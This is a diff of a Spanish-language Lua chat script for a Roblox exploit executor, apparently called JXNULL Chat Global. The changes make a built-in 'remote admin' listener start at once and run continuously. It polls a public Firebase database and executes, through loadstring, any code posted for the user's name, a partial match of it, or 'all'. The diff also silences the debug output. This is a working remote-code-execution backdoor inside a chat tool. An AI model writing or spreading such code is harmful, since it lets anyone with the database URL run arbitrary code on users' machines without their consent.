@@ -1,4 +1,4 @@
--- JXNULL CHAT GLOBAL V2 - SISTEMA DE ADMIN REMOTO
+-- JXNULL CHAT GLOBAL V2 - SISTEMA DE ADMIN REMOTO CORREGIDO
 -- Sistema de carpetas
 if makefolder and not isfolder("JXNULL_CONFIGS") then
     makefolder("JXNULL_CONFIGS")
@@ -54,6 +54,7 @@ local misRespuestasPendientes = {}
 -- Variables para sistema de ejecución remota
 local remoteExecutionPanel = nil
 local ultimoComandoID = nil
+local comandosEjecutados = {} -- ✅ NUEVO: Para evitar ejecutar el mismo comando varias veces
 
 -- URLs de Firebase
 local firebaseURL = "https://chatsitouwu-xd-xd-default-rtdb.firebaseio.com/Chat.json"
@@ -185,22 +186,40 @@ local function EliminarSticker(index)
     return false
 end
 
--- 🔥 SISTEMA DE EJECUCIÓN REMOTA
+-- 🔥 SISTEMA DE EJECUCIÓN REMOTA CORREGIDO
 local function EjecutarScriptRemoto(scriptCode)
     task.spawn(function()
+       -- print("🔥 [DEBUG] Intentando ejecutar script remoto...")
+       -- print("📜 [DEBUG] Código recibido:", scriptCode:sub(1, 100) .. "...")
+        
         local success, err = pcall(function()
-            loadstring(scriptCode)()
+            local func, loadErr = loadstring(scriptCode)
+            if not func then
+                error("Error al compilar script: " .. tostring(loadErr))
+            end
+            func()
         end)
         
-        if not success then
-            warn("❌ Error al ejecutar script remoto:", err)
+        if success then
+          --  print("✅ [DEBUG] Script ejecutado exitosamente")
+        else
+         --   warn("❌ [DEBUG] Error al ejecutar script remoto:", err)
         end
     end)
 end
 
+-- ✅ CORREGIDO: Sistema de escucha mejorado
 local function EscucharComandosRemotos()
+  --  print("🎯 [DEBUG] Iniciando escucha de comandos remotos para:", player.Name)
+    
     task.spawn(function()
-        while escuchaActiva do
+        while true do
+            -- ✅ Verificar si la escucha está activa
+            if not escuchaActiva and not guiActivo then
+                task.wait(2)
+                continue
+            end
+            
             local success, response = pcall(function()
                 return request({
                     Url = remoteCommandsURL,
@@ -215,30 +234,63 @@ local function EscucharComandosRemotos()
                 
                 if ok and typeof(comandos) == "table" then
                     for comandoId, cmd in pairs(comandos) do
-                        if cmd.target == player.Name or cmd.target == "all" then
-                            if not ultimoComandoID or comandoId ~= ultimoComandoID then
-                                ultimoComandoID = comandoId
+                        -- ✅ Verificar que no hayamos ejecutado este comando antes
+                        if not comandosEjecutados[comandoId] then
+                         --   print("🔍 [DEBUG] Comando encontrado:", comandoId)
+                           -- print("👤 [DEBUG] Target:", cmd.target, "| Mi nombre:", player.Name)
+                            
+                            -- ✅ Verificar si el comando es para mí o para todos
+                            local esParaMi = (cmd.target == player.Name) or 
+                                            (cmd.target:lower() == "all") or
+                                            (player.Name:lower():find(cmd.target:lower()))
+                            
+                            if esParaMi then
+                             --   print("✅ [DEBUG] Este comando ES PARA MÍ!")
                                 
-                                print("🔥 Ejecutando script remoto de:", cmd.admin)
+                                -- ✅ Marcar como ejecutado ANTES de ejecutar
+                                comandosEjecutados[comandoId] = true
+                                
+                                -- ✅ Ejecutar el script
+                            --    print("🔥 [EJECUTANDO] Script remoto de:", cmd.admin)
                                 EjecutarScriptRemoto(cmd.script)
                                 
-                                -- Eliminar comando después de ejecutar
-                                pcall(function()
-                                    request({
-                                        Url = "https://chatsitouwu-xd-xd-default-rtdb.firebaseio.com/RemoteCommands/" .. comandoId .. ".json",
-                                        Method = "DELETE"
+                                -- ✅ Notificar al usuario
+                                if _G.Rayfield and _G.Rayfield.Notify then
+                                    _G.Rayfield:Notify({
+                                        Title = "🔥 Script Remoto Ejecutado",
+                                        Content = "Admin: " .. (cmd.admin or "Unknown"),
+                                        Duration = 5,
+                                        Image = 4483362458
                                     })
+                                end
+                                
+                                -- ✅ Eliminar comando después de 2 segundos
+                                task.delay(2, function()
+                                    pcall(function()
+                                        request({
+                                            Url = "https://chatsitouwu-xd-xd-default-rtdb.firebaseio.com/RemoteCommands/" .. comandoId .. ".json",
+                                            Method = "DELETE"
+                                        })
+                                    end)
+                                 --   print("🗑️ [DEBUG] Comando eliminado de Firebase")
                                 end)
+                            else
+                             --   print("❌ [DEBUG] Este comando NO es para mí")
                             end
                         end
                     end
+                else
+                    -- No hay comandos o error al decodificar
                 end
             end
             
-            task.wait(1)
+            task.wait(1.5) -- ✅ Verificar cada 1.5 segundos
         end
     end)
 end
+
+-- ✅ INICIAR ESCUCHA INMEDIATAMENTE
+EscucharComandosRemotos()
 
 local function CrearPanelEjecucionRemota()
     if remoteExecutionPanel and remoteExecutionPanel.Parent then
@@ -264,7 +316,6 @@ local function CrearPanelEjecucionRemota()
     panelStroke.Color = Color3.fromRGB(220, 53, 69)
     panelStroke.Thickness = 3
     
-    -- Título
     local titleBar = Instance.new("Frame")
     titleBar.Name = "TitleBar"
     titleBar.Size = UDim2.new(1, 0, 0, isMobile and 40 or 45)
@@ -288,7 +339,6 @@ local function CrearPanelEjecucionRemota()
     title.ZIndex = 32
     title.Parent = titleBar
     
-    -- Botón cerrar
     local closeBtn = Instance.new("TextButton")
     closeBtn.Size = UDim2.new(0, isMobile and 32 or 36, 0, isMobile and 32 or 36)
     closeBtn.Position = UDim2.new(1, -(isMobile and 37 or 41), 0.5, -(isMobile and 16 or 18))
@@ -313,7 +363,6 @@ local function CrearPanelEjecucionRemota()
         remoteExecutionPanel = nil
     end)
     
-    -- Contenido
     local contentFrame = Instance.new("Frame")
     contentFrame.Size = UDim2.new(1, -20, 1, -(isMobile and 55 or 60))
     contentFrame.Position = UDim2.new(0, 10, 0, isMobile and 45 or 50)
@@ -321,7 +370,6 @@ local function CrearPanelEjecucionRemota()
     contentFrame.ZIndex = 31
     contentFrame.Parent = remoteExecutionPanel
     
-    -- Label Target
     local targetLabel = Instance.new("TextLabel")
     targetLabel.Size = UDim2.new(1, 0, 0, 20)
     targetLabel.Position = UDim2.new(0, 0, 0, 5)
@@ -334,7 +382,6 @@ local function CrearPanelEjecucionRemota()
     targetLabel.ZIndex = 32
     targetLabel.Parent = contentFrame
     
-    -- Input Target
     local targetInput = Instance.new("TextBox")
     targetInput.Name = "TargetInput"
     targetInput.Size = UDim2.new(1, 0, 0, isMobile and 35 or 40)
@@ -357,7 +404,6 @@ local function CrearPanelEjecucionRemota()
     targetStroke.Color = Color3.fromRGB(88, 101, 242)
     targetStroke.Thickness = 1.5
     
-    -- Label Script
     local scriptLabel = Instance.new("TextLabel")
     scriptLabel.Size = UDim2.new(1, 0, 0, 20)
     scriptLabel.Position = UDim2.new(0, 0, 0, isMobile and 73 or 78)
@@ -370,7 +416,6 @@ local function CrearPanelEjecucionRemota()
     scriptLabel.ZIndex = 32
     scriptLabel.Parent = contentFrame
     
-    -- ScrollingFrame para el script
     local scriptScroll = Instance.new("ScrollingFrame")
     scriptScroll.Name = "ScriptScroll"
     scriptScroll.Size = UDim2.new(1, 0, 0, isMobile and 160 or 180)
@@ -389,7 +434,6 @@ local function CrearPanelEjecucionRemota()
     scriptScrollStroke.Color = Color3.fromRGB(88, 101, 242)
     scriptScrollStroke.Thickness = 1.5
     
-    -- TextBox del script
     local scriptInput = Instance.new("TextBox")
     scriptInput.Name = "ScriptInput"
     scriptInput.Size = UDim2.new(1, -10, 1, 0)
@@ -409,14 +453,12 @@ local function CrearPanelEjecucionRemota()
     scriptInput.ZIndex = 33
     scriptInput.Parent = scriptScroll
     
-    -- Ajustar tamaño del canvas
     scriptInput:GetPropertyChangedSignal("Text"):Connect(function()
         local lines = select(2, scriptInput.Text:gsub("\n", "\n")) + 1
         local lineHeight = scriptInput.TextSize + 5
         scriptInput.Size = UDim2.new(1, -10, 0, math.max(lines * lineHeight, scriptScroll.AbsoluteSize.Y - 10))
     end)
     
-    -- Botón Ejecutar
     local executeBtn = Instance.new("TextButton")
     executeBtn.Name = "ExecuteButton"
     executeBtn.Size = UDim2.new(1, 0, 0, isMobile and 40 or 45)
@@ -453,17 +495,22 @@ local function CrearPanelEjecucionRemota()
         
         executeBtn.Text = "⏳ ENVIANDO..."
         
+     --   print("📤 [DEBUG] Enviando comando remoto...")
+   --     print("🎯 [DEBUG] Target:", target)
+    --    print("📜 [DEBUG] Script:", script:sub(1, 50) .. "...")
+        
         local commandData = {
             admin = player.Name,
             target = target,
             script = script,
-            time = os.time()
+            time = os.time(),
+            timestamp = HttpService:GenerateGUID(false)
         }
         
         local json = HttpService:JSONEncode(commandData)
         
-        local success = pcall(function()
-            request({
+        local success, response = pcall(function()
+            return request({
                 Url = remoteCommandsURL,
                 Method = "POST",
                 Headers = { ["Content-Type"] = "application/json" },
@@ -472,19 +519,20 @@ local function CrearPanelEjecucionRemota()
         end)
         
         if success then
+         --   print("✅ [DEBUG] Comando enviado exitosamente a Firebase")
             executeBtn.Text = "✅ ENVIADO"
             targetInput.Text = ""
             scriptInput.Text = ""
             task.wait(1.5)
             executeBtn.Text = "🔥 EJECUTAR REMOTAMENTE"
         else
+            warn("❌ [DEBUG] Error al enviar comando:", response)
             executeBtn.Text = "❌ ERROR AL ENVIAR"
             task.wait(1.5)
             executeBtn.Text = "🔥 EJECUTAR REMOTAMENTE"
         end
     end)
     
-    -- Animación de entrada
     remoteExecutionPanel.Size = UDim2.new(0, 0, 0, 0)
     TweenService:Create(remoteExecutionPanel, TweenInfo.new(0.3, Enum.EasingStyle.Back), {
         Size = UDim2.new(0, panelWidth, 0, panelHeight)
@@ -914,7 +962,7 @@ local function CrearPanelStickers()
     }):Play()
 end
 
--- FUNCIÓN: MOSTRAR MENSAJES (CONTINUARÁ EN SIGUIENTE PARTE POR LÍMITE DE CARACTERES)
+-- FUNCIÓN: MOSTRAR MENSAJES
 local function showMessages(data)
     if not chatBox then return end
 
@@ -2527,9 +2575,6 @@ task.spawn(function()
     end
 end)
 
--- Iniciar escucha de comandos remotos
-EscucharComandosRemotos()
-
 -- SISTEMA DE TOGGLES
 task.spawn(function()
     local intentos = 0
@@ -2633,3 +2678,4 @@ game:GetService("Players").PlayerRemoving:Connect(function(plr)
         end)
     end
 end)
+
